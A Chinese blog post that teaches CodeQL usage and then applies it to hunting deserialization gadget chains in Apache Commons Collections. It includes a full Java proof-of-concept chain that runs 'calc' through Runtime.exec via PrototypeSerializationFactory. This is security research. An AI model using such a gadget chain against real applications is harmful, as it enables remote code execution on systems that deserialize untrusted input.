# CodeQL使用流程

# 前言

好久没用CodeQL了，看了自己之前写的文章发现竟然没有做过相关记录
然后就不知道怎么用了hhh

# 使用流程

## 0x1 生成数据库

我们拿到一套源码，首先需要使用CodeQL生成数据库

执行命令：
`codeql database create <database> --language=<language-identifier>`
参数说明：
`<database>`：创建数据库的路径，目录会在执行命令的时候被创建
`--language`: 指定数据库语言，输入标识符。当和--db-cluster一起使用时，可以指定多个，用','分隔，也可以进行多次指定。
`--db-cluster`：为多种语言创建数据库
`--command`：创建一个或多个编译语言数据库的时候使用。python和JavaScript/TypeScript不需要该参数，如果编译语言不带该参数，codeql会自动检测并编译
`--no-run-unnecessary-builds`：为多语言创建数据库，且包括编译和非编译语言时，可以利用 `--no-run-unnecessary-builds`来帮助非编译语言跳过command选项
[更多参数说明](https://codeql.github.com/docs/codeql-cli/manual/database-create/)
CodeQL支持以下语言

| 语言                  | 标识符     |
| :-------------------- | :--------- |
| C/C++                 | cpp        |
| C#                    | csharp     |
| GO                    | go         |
| Java                  | java       |
| JavaScript/TypeScript | javascript |
| Python                | python     |
| Ruby                  | ruby       |

案例：

```bash
codeql database create xxx-database  --language="java"  --command="mvn clean install --file pom.xml" --source-root=文件目录
或者
codeql database create test --language=java --command="mvn clean compile --file pom.xml -Dmaven.test.skip=true" --source-root=../micro_service_seclab/
# 如何mvn编译报错使用 mvn compile -fn忽略错误
```

![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/2254682-20220721095751583-1878317051.png)

成功之后
![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/2254682-20220721095758244-288079261.png)

然后在当前目录下会生成一个名为“xxx-database”的文件夹

## 0x2导入codeql规则

这里使用‘starter workspace’，也就是git仓库

1. 下载starter
   `git clone --recursive https://github.com/github/vscode-codeql-starter/`
   或者
   `git clone https://github.com/github/vscode-codeql-starter/`
   项目下载完成后，进入项目目录
   `git submodule update --init`
   `git submodule update --remote`
   确保包含需要的子模块
   截图使用的是第一种方法
   ![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/2254682-20220721095808048-1198335950.png)

子模块需要定期更新
![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/2254682-20220721095815620-7530655.png)

1. 在VS Code中打开starter workspace
   ![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/2254682-20220721095825356-1889696064.png)

![img](https://img2022.cnblogs.com/blog/2254682/202207/2254682-20220721095832287-445181450.png)

注意：
starter子模块中包括C/C++, C#, Java, JavaScript, Python, Ruby以及GO的规则，在vscode-codeql-starter\ql下
CodeQL暂时无法扫描php代码

## 0x3 导入数据库

我们生成的数据库为文件夹，那我们就选择 "From a folder"
![img](https://img2022.cnblogs.com/blog/2254682/202207/2254682-20220721095847344-746141093.png)

## 运行规则

点开项目文件，我们可以看见ql下有很多规则
![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/2254682-20220721095857361-1116328754.png)

因为示例源码为java语言，我们选择java下的规则文件夹
右键选择"CodeQL:RunQueries in Selected Files"
里面有81个CWE规则
![img](https://img2022.cnblogs.com/blog/2254682/202207/2254682-20220721095905856-2027480920.png)

## 查看结果

点击左侧的一条规则，可以看到对应规则运行的结果在右侧
![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/2254682-20220721095913030-69564831.png)



### 闭源构建数据库

闭源项目创建数据库，可以使用该工具：[https://github.com/ice-doom/codeql_compile](https://link.zhihu.com/?target=https%3A//github.com/ice-doom/codeql_compile)

- [https://github.com/waderwu/extractor-java](https://link.zhihu.com/?target=https%3A//github.com/waderwu/extractor-java)
  同样可以在windows中使用，将run.py中的codeql_home手工修改，而不是使用which命令得到路径







# **简单使用**

### Method内置方法

```text
method.getName() 获取的是当前方法的名称
method.getDeclaringType() 获取的是当前方法所属class的名称。
method.hasName() 判断是否有该方法
    
import java

from Method method
where method.hasName("getStudent")
select method.getName(), method.getDeclaringType()
```

### 谓词

```text
predicate 表示当前方法没有返回值。
exists子查询，是CodeQL谓词语法里非常常见的语法结构，它根据内部的子查询返回true or false，来决定筛选出哪些数据。
    
import java

predicate isStudent(Method method) {
exists(|method.hasName("getStudent"))
}

from Method method
where isStudent(method)
select method.getName(), method.getDeclaringType()
    
    
//没有结果的谓词
predicate isSmall(int i) {
  i in [1 .. 9]
}
//带有返回结果的谓词
int getSuccessor(int i) {
  result = i + 1 and
  i in [1 .. 9]
} //如果i是小于10的正整数，那么谓词的返回结果就是i后面的那个整数
```

### 设置Source Sink

```text
什么是source和sink
在代码自动化安全审计的理论当中，有一个最核心的三元组概念，就是(source，sink和sanitizer)。
source是指漏洞污染链条的输入点。比如获取http请求的参数部分，就是非常明显的Source。
sink是指漏洞污染链条的执行点，比如SQL注入漏洞，最终执行SQL语句的函数就是sink(这个函数可能叫query或者exeSql，或者其它)。
sanitizer又叫净化函数，是指在整个的漏洞链条当中，如果存在一个方法阻断了整个传递链，那么这个方法就叫sanitizer。
```

### 设置source

```text
override predicate isSource(DataFlow::Node src) {}

// 通用的source入口规则
override predicate isSource(DataFlow::Node src) { src instanceof RemoteFlowSource }
```

### 设置Sink

```text
override predicate isSink(DataFlow::Node sink) {

  }

// 查找一个query()方法的调用点，并把它的第一个参数设置为sink
override predicate isSink(DataFlow::Node sink) {
exists(Method method, MethodAccess call |
  method.hasName("query")
  and
  call.getMethod() = method and
  sink.asExpr() = call.getArgument(0)
)
}
```

### Flow数据流

连通工作就是CodeQL引擎本身来完成的。我们通过使用`config.hasFlowPath(source, sink)`方法来判断是否连通。

```text
from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink
where config.hasFlowPath(source, sink)
select source.getNode(), source, sink, "source"

//我们传递给config.hasFlowPath(source, sink)我们定义好的source和sink，系统就会自动帮我们判断是否存在漏洞了
```

### 命令行持续化使用规则

在编写了相应规则之后，就可以直接在命令行行中执行规则，检测其他项目

首先生成`Database`

之后通过我们编写的规则进行分析，输出为CSV文件

```text
codeql database analyze /CodeQL/databases/micro-service-seclab /CodeQL/ql/java/ql/examples/demo --format=csv --output=/CodeQL/Result/micro-service-seclab.csv --rerun
```

### 实例

### 使用`jdbcTemplate.query`方法的SQL注入

```text
import java 
import semmle.code.java.dataflow.FlowSources
import semmle.code.java.security.QueryInjection
import DataFlow::PathGraph

class VulConfig extends TaintTracking::Configuration {
    VulConfig() { this = "SqlinjectionConfig" }
    
    override predicate isSource(DataFlow::Node source) {
        source instanceof RemoteFlowSource
    }
    
    override predicate isSink(DataFlow::Node sink) {
        exists(Method method, MethodAccess call | 
            method.hasName("query")
            and call.getMethod() = method
            and sink.asExpr() = call.getArgument(0))
    }
}

from VulConfig vulconfig, DataFlow::PathNode source, DataFlow::PathNode sink
where vulconfig.hasFlowPath(source, sink)
select source.getNode(), source, sink, "source"
```

### 报错解决

如果存在`Source`位置是`List<Long> param`类型的传参，这里是不可能存在SQL注入的我们可以使用`TaintTracking::Configuration`提供的净化方法`isSanitizer`

```text
override predicate isSanitizer(DataFlow::Node node) {
    node.getType() instanceof PrimitiveType or
    node.getType() instanceof BoxedType or
    node.getType() instanceof NumberType or
    exists(ParameterizedType pt | node.getType() = pt and
    pt.getTypeArgument(0) instanceof NumberType)
}
```

### 复杂使用

### instanceof优化查询结构

我们可以使用exists(|)这种子查询的方式定义source和sink，但是如果source/sink特别复杂（比如我们为了规则通用，可能要适配springboot， Thrift RPC，Servlet等source），如果我们把这些都在一个子查询内完成，比如 condition 1 or conditon 2 or condition 3, 这样一直下去，我们可能后面都看不懂了，更别说可维护性了。

instanceof给我们提供了一种机制，我们只需要定义一个abstract class

比如`RemoteFlowSource`抽象类的编写

```text
/** A data flow source of remote user input. */
abstract class RemoteFlowSource extends DataFlow::Node {
  /** Gets a string that describes the type of this remote flow source. */
  abstract string getSourceType();
}
```

CodeQL和Java不太一样，只要我们的子类继承了这个RemoteFlowSource类，那么所有子类就会被调用，它所代表的source也会被加载

存在非常多继承这个抽象类的子类，所以他们的结果会被and串联在一起

### 递归查询

CodeQL里面的递归调用语法是：在谓词方法的后面跟*或者+，来表示调用0次以上和1次以上（和正则类似），0次会打印自己

在Java语言里，我们可以使用class嵌套class，多个内嵌class的时候，我们需要知道最外层的class是什么怎么办？

非递归，知道嵌套的层数：

```text
import java

from Class classes
where classes.getName().toString() = "innerTwo"
select classes.getEnclosingType().getEnclosingType()   // getEnclosingtype获取作用域
```

**使用递归语法**

```text
from Class classes
where classes.getName().toString() = "innerTwo"
select classes.getEnclosingType+()   // 获取作用域
```

[代码分析平台CodeQL学习手记（七） - 嘶吼 RoarTalk – 回归最本质的信息安全,互联网安全新媒体,4hou.com](https://link.zhihu.com/?target=https%3A//www.4hou.com/posts/R5vz)

### 强制类型转换

```text
import java

from Parameter param
select param, param.getType().(IntegralType) //筛选出getType方法符合后面了类型的结果
```

## 正文

这里主要是探讨由transform调用层面的挖掘

### transform

我们通过codeql寻找transform方法的调用

```text
class TransformCallable extends Callable {
    TransformCallable() {
        this.getName().matches("transform") and
        this.getNumberOfParameters() = 1
    }
}
```



![img](https://pic3.zhimg.com/80/v2-9347ceaf362520d6b2e30b5e7fbe13c6_720w.webp)



可以看出来结果挺多的，之后我们人工排查一下

### TransformedCollection

在`TransformedCollection#transform`的调用中存在可以调用其他transformer的transform方法的逻辑



![img](https://pic2.zhimg.com/80/v2-f9a65d6bc29467f358f04947a2d7973d_720w.webp)

没啥用，都已经可以调用任意transform了，还需要这一步吗？

### ChainedTransformer

在`ChainedTransformer#transform`方法中存在`iTransformers`中的所有的transform的调用，这里也就是yoserial项目中的利用链**
**

![img](https://pic1.zhimg.com/80/v2-ffd8f342b82b4353a19b91848835a9f8_720w.webp)

没啥用，都已经可以调用任意transform了，还需要这一步吗？



### CloneTransformer

在`CloneTransformer#transform`方法中存在, PrototypeFactory类实例化之后调用了create方法

![img](https://pic1.zhimg.com/80/v2-9846098744b8a119a4c1236cfcfde574_720w.webp)

我们跟进一下

![img](https://pic2.zhimg.com/80/v2-997d71ced4d8c0eecf4c4f23e1839d95_720w.webp)

代码中表示如果需要transformer的类存在clone方法，就会返回一个`new PrototypeCloneFactory`对象，之后调用他的create方法，如果没有就会进入catch语句，返回一个`new InstantiateFactory`对象，但是这里因为在其类中的create方法中参数不可控不能够利用

![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/v2-a020e863756dac86f62382e94ffae7c6_720w.webp)

### ClosureTransformer

在`ClosureTransformer#transform`方法中，存在`Closure#execute`方法的调用

![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/v2-07f8647c9b6a9af4c2791eec3dac3b76_720w.webp)

Closure#execute

我们来查找一下有没有可用的实现了`org.apache.commons.collections.Closure`接口的类的execute调用

```text
class ClosureCallable extends Callable {
    ClosureCallable() {
        this.getName().matches("execute") and
        this.getDeclaringType().getASupertype*().hasQualifiedName("org.apache.commons.collections", "Closure")
    }
}
```

![img](https://pic4.zhimg.com/80/v2-2b3fa17e3b72d5427ba794e53b3e3edf_720w.webp)

我们一个一个来看下对应的execute方法

大概看了一下，发现不是`this.iClosure.execute(input)`调用就是`this.iPredicate.evaluate(input)`

只有一个`TransformerClosure#execute`方法中调用了transform，但是也不能形成利用链，最多算一个中转

### ConstantTransformer

在`ConstantTransformer#transform`方法中，将会返回一个构造方法，同样在yoserial中有所利用

### FactoryTransformer

在`FactoryTransformer#transform`方法中，调用了`Factory`接口的类的create方法
查看一下满足条件的类把

### Factory#create

```text
class FactoryCallable extends Callable {
    FactoryCallable() {
        this.getName().matches("create") and
        this.getDeclaringType().getASupertype*().hasQualifiedName("org.apache.commons.collections", "Factory")
    }
}
```



![img](https://pic4.zhimg.com/80/v2-2d7f2b4e9edce55ec1879bc4eb30ec43_720w.webp)

进入看一看

### InstantiateFactory

这里有一个`InstantiateFactory`类，好生熟悉，这不就是之前那篇文章中的CC链的挖掘，在其create方法中存在构造函数的实例化

![img](https://pic2.zhimg.com/80/v2-5e109aa76b6587cddf271a56054e74b5_720w.webp)

例如已知的`TrAXFilter`, 我们尝试挖掘一下

类似其中会调用TemplateImpl#newTransformer方法

```text
/**
 * @kind path-problem
 */
import java

class ConstructCallable extends Callable {
    ConstructCallable() {
        this instanceof Constructor
    }
}

class MethodCallable extends Callable {
    MethodCallable() {
        this.getName().matches("newTransformer") and
        this.getDeclaringType().getName().matches("TemplatesImpl")
    }
}

query predicate edges(Callable a, Callable b) {
    a.polyCalls(b)
}

from MethodCallable endcall, ConstructCallable entrypoint
where edges+(entrypoint, endcall)
select endcall, entrypoint, endcall, "find Contructor in jdk"
```

![img](https://pic1.zhimg.com/80/v2-64f0177e9f263a8405b18d2d833be88c_720w.webp)

很合理我们得到了这个构造方法

虽然这里的`iConstructor`属性被`transient`修饰，但是在findConstructor中存在赋值

### PrototypeSerializationFactory

之后有一个类为`PrototypeSerializationFactory`他是一个静态内部类

![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/v2-bbc985eeafceb32639aa5426b05c95e6_720w.webp)

刚开始看的时候觉得这不纯纯一个二次反序列化的入口吗，直接跟进一下子代码

在其构造函数中有对`iPrototype`属性的赋值操作
我们可以尝试直接将CC6拼接上去

```text
import org.apache.commons.collections.Factory;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC6_plus_plus {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception{
        //仿照ysoserial中的写法，防止在本地调试的时候触发命令
        Transformer[] faketransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Class[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"}),
                new ConstantTransformer(1),
        };
        Transformer transformerChain = new ChainedTransformer(faketransformers);
        Map innerMap = new HashMap();
        Map outMap = LazyMap.decorate(innerMap, transformerChain);

        //实例化
        TiedMapEntry tme = new TiedMapEntry(outMap, "key");
        Map expMap = new HashMap();
        //将其作为key键传入
        expMap.put(tme, "value");

        //remove
        outMap.remove("key");

        //传入利用链
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        Class c;
        c = Class.forName("org.apache.commons.collections.functors.PrototypeFactory$PrototypeSerializationFactory");
        Constructor constructor = c.getDeclaredConstructor(Serializable.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(expMap);

        FactoryTransformer factoryTransformer = new FactoryTransformer((Factory) o);

        ConstantTransformer constantTransformer = new ConstantTransformer(1);

        Map innerMap1 = new HashMap();
        LazyMap outerMap1 = (LazyMap)LazyMap.decorate(innerMap1, constantTransformer);

        TiedMapEntry tme1 = new TiedMapEntry(outerMap1, "keykey");

        Map expMap1 = new HashMap();
        expMap1.put(tme1, "valuevalue");
        setFieldValue(outerMap1,"factory",factoryTransformer);

        outerMap1.remove("keykey");
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(expMap);

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
}
```

![img](https://pic3.zhimg.com/80/v2-9408b1868fa058f0100f80ae41c56e66_720w.webp)

能够成功执行，好吧，感觉挺鸡肋的，但是应该可以结合其他依赖，作为其他反序列入口来打，或者作为一个黑名单绕过

### PrototypeCloneFactory

之后又是一个`PrototypeCloneFactory#create`方法中

![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/v2-611eaaf8d7999cfe8beb18e146d60cd9_720w.webp)

似乎可以任意方法的调用，但是我们注意到

![img](https://pic4.zhimg.com/80/v2-7258d67e7aca11349cf534a14649f37f_720w.webp)

其被transient修饰，且不像`InstantiateFactory`中存在赋值操作，但是我们同样可以注意到其在调用`findCloneMethod`方法中的时候，取出了对应类的clone方法，如果clone方法有可以利用的是不是就可以形成利用链

![img](https://pic1.zhimg.com/80/v2-67427b6b7adf3c684227b3402be0bc48_720w.webp)

我们查找一下clone方法存在的类

```text
import java

class CloneCallable extends Callable{
    CloneCallable() {
        this.getName().matches("clone")
    }
}
from CloneCallable c
select c,c.getBody(), c.getDeclaringType()
```

![img](https://pic2.zhimg.com/80/v2-53c714fb07bcfa4dd92e876ec893bf01_720w.webp)

在BeanMap中，对应的clone方法中存在newInstance的调用且其`beanClass`可控，但是是无参构造方法，无法形成利用链

![img](https://pic4.zhimg.com/80/v2-b43ef3e13ede5a7c1edd4227f6734d9b_720w.webp)

其他的调用我简单看了一下，没有什么特别的地方

最后一个是`ReflectionFactory`的调用，同样是无参构造方法

### InstantiateTransformer

而对于`InstantiateTransformer#transform`方法中可以进行`InvokerTransformer`的替代使用，可以触发一些类的构造方法

![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/v2-1892900916ae7364f1c29d42cc0c9697_720w.webp)

比如说`TrAXFilter`

![img](https://pic2.zhimg.com/80/v2-787edefd52a4e1960244084adf1139f1_720w.webp)

### InvokerTransformer

接下来就是ysoserial中存在的`InvokerTransformer#transform`方法中可以反射调用可控的方法

![img](https://pic2.zhimg.com/80/v2-17268bf1dfe3bd284166651529e3d2bd_720w.webp)

### PredicateTransformer

而又在`PredicateTransformer#transform`方法中存在`Predicate`接口实现类的evaluate方法

![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/v2-3b8177d81dbf7262646180da64041558_720w.webp)

### Predicate#evaluate

浅看一下对应类

```text
import java

class PredicateCallable extends Callable {
    PredicateCallable() {
        this.getName().matches("evaluate") and
        this.getDeclaringType().getASupertype*().hasQualifiedName("org.apache.commons.collections", "Predicate")
    }
}

from PredicateCallable c 
select c, c.getBody(), c.getDeclaringType()
```

![img](https://pic1.zhimg.com/80/v2-6f5bee2257c4a4372d3e33709317c270_720w.webp)

都是一些没有亮点的东西

### SwitchTransformer

之后`SwitchTransformer#transform`方法中，存在有类似`ChainedTransformer#transform`的功能

![img](https://pic4.zhimg.com/80/v2-7258d67e7aca11349cf534a14649f37f_720w.webp)

但是需要满足`this.iPredicates[i].evaluate(input)`为true,而且似乎这里只能调用一次transform，不能形成链子，也没有了意义

## 总结

链子没有挖出来什么比较新的链子，有一个比较鸡肋的二次反序列化的链子，但是主要还是体会这种使用静态分析工具辅助自己进行挖掘新链,这次主要是在CC链中进行transformer层面的深度挖掘，当然还可以在动态代理等等方面进行深层次的探索，又或者以来其他依赖库结合进行挖掘利用的方式也是可行的
